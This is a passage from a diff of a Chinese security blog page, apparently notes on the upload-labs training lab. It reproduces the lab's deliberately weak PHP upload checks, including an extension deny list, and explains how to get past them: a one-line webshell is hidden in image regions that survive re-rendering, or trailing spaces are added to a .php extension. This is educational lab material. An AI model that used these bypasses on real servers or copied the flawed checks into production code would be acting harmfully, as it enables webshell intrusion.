class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">// 获得上传文件的基本信息，文件名，类型，大小，临时文件路径</span></span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];<span class="comment">//会去获得浏览器中的content-type</span></span><br><span class="line">    <span class="variable">$filetype</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line">    <span class="variable">$tmpname</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$target_path</span>=UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">basename</span>(<span class="variable">$filename</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获得上传文件的扩展名</span></span><br><span class="line">    <span class="variable">$fileext</span>= <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">strrchr</span>(<span class="variable">$filename</span>,<span class="string">&quot;.&quot;</span>),<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//判断文件后缀与类型，合法才进行上传操作</span></span><br><span class="line">    <span class="keyword">if</span>((<span class="variable">$fileext</span> == <span class="string">&quot;jpg&quot;</span>) &amp;&amp; (<span class="variable">$filetype</span>==<span class="string">&quot;image/jpeg&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmpname</span>,<span class="variable">$target_path</span>))&#123;</span><br><span class="line">            <span class="variable">$im</span> = <span class="title function_ invoke__">imagecreatefromjpeg</span>(<span class="variable">$target_path</span>);<span class="comment">//使用上传的图片生成新的图片,文件的重写，二次渲染</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$im</span> == <span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;该文件不是jpg格式的图片！&quot;</span>;</span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                <span class="title function_ invoke__">srand</span>(<span class="title function_ invoke__">time</span>());</span><br><span class="line">                <span class="variable">$newfilename</span> = <span class="title function_ invoke__">strval</span>(<span class="title function_ invoke__">rand</span>()).<span class="string">&quot;.jpg&quot;</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$newfilename</span>;</span><br><span class="line">                <span class="title function_ invoke__">imagejpeg</span>(<span class="variable">$im</span>,<span class="variable">$img_path</span>);</span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>);</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>((<span class="variable">$fileext</span> == <span class="string">&quot;png&quot;</span>) &amp;&amp; (<span class="variable">$filetype</span>==<span class="string">&quot;image/png&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmpname</span>,<span class="variable">$target_path</span>))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            <span class="variable">$im</span> = <span class="title function_ invoke__">imagecreatefrompng</span>(<span class="variable">$target_path</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$im</span> == <span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;该文件不是png格式的图片！&quot;</span>;</span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                 <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                <span class="title function_ invoke__">srand</span>(<span class="title function_ invoke__">time</span>());</span><br><span class="line">                <span class="variable">$newfilename</span> = <span class="title function_ invoke__">strval</span>(<span class="title function_ invoke__">rand</span>()).<span class="string">&quot;.png&quot;</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$newfilename</span>;</span><br><span class="line">                <span class="title function_ invoke__">imagepng</span>(<span class="variable">$im</span>,<span class="variable">$img_path</span>);</span><br><span class="line"></span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>);</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;         </span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>((<span class="variable">$fileext</span> == <span class="string">&quot;gif&quot;</span>) &amp;&amp; (<span class="variable">$filetype</span>==<span class="string">&quot;image/gif&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmpname</span>,<span class="variable">$target_path</span>))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            <span class="variable">$im</span> = <span class="title function_ invoke__">imagecreatefromgif</span>(<span class="variable">$target_path</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$im</span> == <span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;该文件不是gif格式的图片！&quot;</span>;</span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                <span class="title function_ invoke__">srand</span>(<span class="title function_ invoke__">time</span>());</span><br><span class="line">                <span class="variable">$newfilename</span> = <span class="title function_ invoke__">strval</span>(<span class="title function_ invoke__">rand</span>()).<span class="string">&quot;.gif&quot;</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$newfilename</span>;</span><br><span class="line">                <span class="title function_ invoke__">imagegif</span>(<span class="variable">$im</span>,<span class="variable">$img_path</span>);</span><br><span class="line"></span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>);</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;只允许上传后缀为.jpg|.png|.gif的图片文件！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>经过二次渲染以后的图片马，将不会保留一句话木马，只保留图片的原始信息</p>
+</blockquote>
+<p>所以要绕过，我们就去找二次渲染后的图片，然后比较和之前的图片相同的地方，然后因为那里面是不会被二次渲染的，我们在那里插入我们的一句话木马</p>
+<blockquote>
+<p>但是推荐用gif，因为gif的二次渲染的相匹配的更多</p>
+</blockquote>
+<h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><blockquote>
+<p>php二次渲染不会重复多次渲染，我们可以检测二次渲染过后的再上传再看，然后再在二次渲染的图片中插入一句话木马，有可能不会被二次渲染掉</p>
+</blockquote>
+<p>‍</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93%E7%BB%95%E8%BF%87/" data-id="cmawcfx9k002scg7k75xw6yr4" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-Web/文件上传/upload-labs/加空格绕过" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/%E5%8A%A0%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87/" class="article-date">
+  <time class="dt-published" datetime="2025-05-20T00:55:54.000Z" itemprop="datePublished">2025-05-20</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="加空格绕过"><a href="#加空格绕过" class="headerlink" title="加空格绕过"></a>加空格绕过</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="title function_ invoke__">rand</span>(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件不允许上传&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>我们发现没有去空，所以我们可以尝试多加空格</p>
+</blockquote>
+<blockquote>
+<p>​<code>$file_name = $_FILES[&#39;upload_file&#39;][&#39;name&#39;];</code>​   我们上传的有空格的后缀，会直接提交上去，所以后面的后缀是php      这样</p>
+</blockquote>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/%E5%8A%A0%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87/" data-id="cmawcfx9l002vcg7kag6gc7m5" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -838,11 +645,11 @@
       <ul>
         
           <li>
-            <a href="/2025/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/xsstrike/">(no title)</a>
+            <a href="/2025/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/sqlmap/">(no title)</a>
           </li>
         
           <li>
-            <a href="/2025/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/sqlmap/">(no title)</a>
+            <a href="/2025/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/xsstrike/">(no title)</a>
           </li>
         
           <li>
@@ -850,11 +657,11 @@
           </li>
         
           <li>
-            <a href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/%E5%9F%BA%E7%A1%80%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B/">(no title)</a>
+            <a href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/Apache%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E+%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/">(no title)</a>
           </li>
         
           <li>
-            <a href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/">(no title)</a>
+            <a href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/user.ini/">(no title)</a>
           </li>
         
       </ul>
